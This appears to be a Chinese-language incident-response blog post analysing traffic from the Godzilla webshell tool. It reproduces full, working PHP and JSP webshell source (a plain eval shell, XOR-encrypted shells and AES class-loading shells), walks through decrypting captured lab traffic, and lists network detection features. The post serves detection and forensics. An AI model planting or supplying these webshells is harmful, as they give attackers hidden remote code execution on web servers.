---
title: C2 流量分析 - Godzillav
published: 2025-03-09 16:49:16
tags: [应急响应]
category: 安全
draft: false
---

# C2 流量分析 - Godzillav

> https://github.com/BeichenDream/Godzilla | Godzilla 版本 4.0.1
> 

> https://feifeitan.cn/index.php/archives/280/
> 

## PHP

哥斯拉有三种生成PHP webshell的类型

![image.png](image%2045.png)

### PHP_EVAL_XOR_BASE64

生成的是很简单的`webshell`

```php
<?php
eval($_POST["pass"]);
```

### PHP_XOR_BASE64

```php
<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='pass';
$payloadName='payload';
$key='3c6e0b8a9c15224a';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
		eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
```

通过session来存储payload，检查是否存在密码，存在则将数据进行base64解码然后再XOR得到data。然后再判断是否存在`$_SESSION[$payloadName]` 如果存在则将其取出并解密，然后通过eval执行解密出来的payload，最后返回结果。如果是第一次连接，不存在session时，则对data进行解密，将其存入session中。

### PHP_XOR_RAW

```php
<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$payloadName='payload';
$key='3c6e0b8a9c15224a';
$data=file_get_contents("php://input");
if ($data!==false){
    $data=encode($data,$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
		eval($payload);
        echo encode(@run($data),$key);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
```

和上边差不多，但是这里是使用伪协议来接收数据

### 流量分析

使用`PHP_XOR_BASE64`进行分析

将木上传到靶机，使用哥斯拉连接

![image.png](image%2046.png)

测试连接，提示`success`即可

开启抓包，随即点击进入并执行命令`whoami` 

![image.png](image%2047.png)

连接冰蝎会发出三个包，最后一个是执行`whoami`命令的

![image.png](image%2048.png)

追踪`HTTP`数据流，第一个请求包，加密原理：https://www.freebuf.com/sectool/285693.html

![image.png](image%2049.png)

我这里使用工具进行解密数据

哥斯拉第一次连接shell时，将这些函数定义发送给服务器并存储在session中，后续的shell操作只需要发送函数名称以及对应的函数参数即可

![image.png](image%2050.png)

第一个请求包很大，但是返回包没有任何数据，会设置`$_SESSION`，后续操作都会带上

![image.png](image%2051.png)

第二个包

![image.png](image%2052.png)

可以注意到返回包两边是`md5`的值，在`webshell`中是这样定义的

```php
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
```

将请求包解密后得到

![image.png](image%2053.png)

返回包，根据佬们的文章：哥斯发送的第2个POST请求实际上是通过调用`evalFunc((String)null, "test", parameter)`函数向服务器POST了原始数据为`methodName=test`的加密包，如果服务器返回值（解密后）为`ok`，则说明shell测试连接成功

![image.png](image%2054.png)

第三个包

![image.png](image%2055.png)

对请求进行解密，得到请求`getBasicinfo`方法，是获得服务器的基础信息

![image.png](image%2056.png)

解密返回包

![image.png](image%2057.png)

也就是

![image.png](image%2058.png)

到这里连接哥斯拉的发起三个包就没了

第一步向服务器发送payload并将其存入session，第二步测试连接，第三步获得靶机基础信息

剩下一个是命令执行`whoami`的包

![image.png](image%2059.png)

![image.png](image%2060.png)

## JSP

### JAVA_AES_BASE64

> https://blog.csdn.net/zeros__/article/details/111613134 | https://xz.aliyun.com/news/10004?time__1311=eqUxRDgD9A0QDt3eGNDQu4GIrUqf2u2xTD&u_atoken=f713fe046d7e9eb5c706d741665a23f7&u_asig=1a0c384917414445566481656e003f
> 

```php
<%! 
    String xc = "3c6e0b8a9c15224a"; 
    String pass = "pass"; 
    String md5 = md5(pass + xc); 

    class X extends ClassLoader {
        public X(ClassLoader z) {
            super(z);
        }

        public Class Q(byte[] cb) {
            return super.defineClass(cb, 0, cb.length);
        }
    }

    public byte[] x(byte[] s, boolean m) { 
        try {
            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    public static String md5(String s) { 
        String ret = null;
        try {
            java.security.MessageDigest m;
            m = java.security.MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
        } catch (Exception e) {}
        return ret;
    }

    public static String base64Encode(byte[] bs) throws Exception { 
        Class base64;
        String value = null;
        try { 
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class })
                                    .invoke(Encoder, new Object[] { bs });
        } catch (Exception e) {
            try { 
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[] { byte[].class })
                                        .invoke(Encoder, new Object[] { bs });
            } catch (Exception e2) {}
        }
        return value; 
    }

    public static byte[] base64Decode(String bs) throws Exception { 
        Class base64;
        byte[] value = null;
        try { 
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[] { String.class })
                                    .invoke(decoder, new Object[] { bs });
        } catch (Exception e) {
            try { 
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class })
                                        .invoke(decoder, new Object[] { bs });
            } catch (Exception e2) {}
        }
        return value; 
    }
%>

<%
    try {
        byte[] data = base64Decode(request.getParameter(pass));
        data = x(data, false);

        if (session.getAttribute("payload") == null) {
            session.setAttribute("payload", new X(this.getClass().getClassLoader()).Q(data));
        } else {
            request.setAttribute("parameters", data);
            java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
            Object f = ((Class) session.getAttribute("payload")).newInstance();
            
            f.equals(arrOut);
            f.equals(pageContext);
            
            response.getWriter().write(md5.substring(0, 16));
            f.toString();
            response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
            response.getWriter().write(md5.substring(16));
        }
    } catch (Exception e) {}
%>
```

首先获得参数`pass`将其进行`base64`解码，然后进行AES解密。随后判断是否存在`session payload` ，没有则创建，存在则执行恶意代码，返回加密数据，并在两边添加`MD5`字段

### JAVA_AES_RAW

```php
<%! 
    String xc = "3c6e0b8a9c15224a"; 

    class X extends ClassLoader {
        public X(ClassLoader z) {
            super(z);
        }

        public Class Q(byte[] cb) {
            return super.defineClass(cb, 0, cb.length);
        }
    }

    public byte[] x(byte[] s, boolean m) { 
        try {
            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }
%>

<%
    try {
        int contentLength = Integer.parseInt(request.getHeader("Content-Length"));
        byte[] data = new byte[contentLength];

        java.io.InputStream inputStream = request.getInputStream();
        int _num = 0;

        while ((_num += inputStream.read(data, _num, data.length)) < data.length);

        data = x(data, false);

        if (session.getAttribute("payload") == null) {
            session.setAttribute("payload", new X(this.getClass().getClassLoader()).Q(data));
        } else {
            request.setAttribute("parameters", data);
            Object f = ((Class) session.getAttribute("payload")).newInstance();
            java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();

            f.equals(arrOut);
            f.equals(pageContext);
            f.toString();

            response.getOutputStream().write(x(arrOut.toByteArray(), true));
        }
    } catch (Exception e) {}
%>
```

### 流量分析

和上边一样的操作

![image.png](image%2061.png)

第一个包，请求包

![image.png](image%2062.png)

响应包

```php
HTTP/1.1 200 
Set-Cookie: JSESSIONID=68496C92282D4B98F084836B7FC43E16; Path=/; HttpOnly
Content-Type: text/html
Content-Length: 0
Date: Sat, 08 Mar 2025 07:15:41 GMT
Keep-Alive: timeout=20
Connection: keep-alive
```

第二个包

![image.png](image%2063.png)

![image.png](image%2064.png)

![image.png](image%2065.png)

第三个包

![image.png](image%2066.png)

![image.png](image%2067.png)

![image.png](image%2068.png)

大体上和PHP的过程一样

## 特征

### Accept 字段

弱特征

![image.png](image%2069.png)

### Cookie

`Session`后有一个分号

![image.png](image%2070.png)

### 报文

除了第一个包，其他的返回包都是`MD5[0:16]+callback+MD5[16]`

![image.png](image%2071.png)

### 数据长度

第一个包长度都很大，进行分析的两种`webshell`第一个包都在50000左右，并且响应包是空的

![image.png](image%2072.png)

但是第二个包长度就扫少了很多

![image.png](image%2073.png)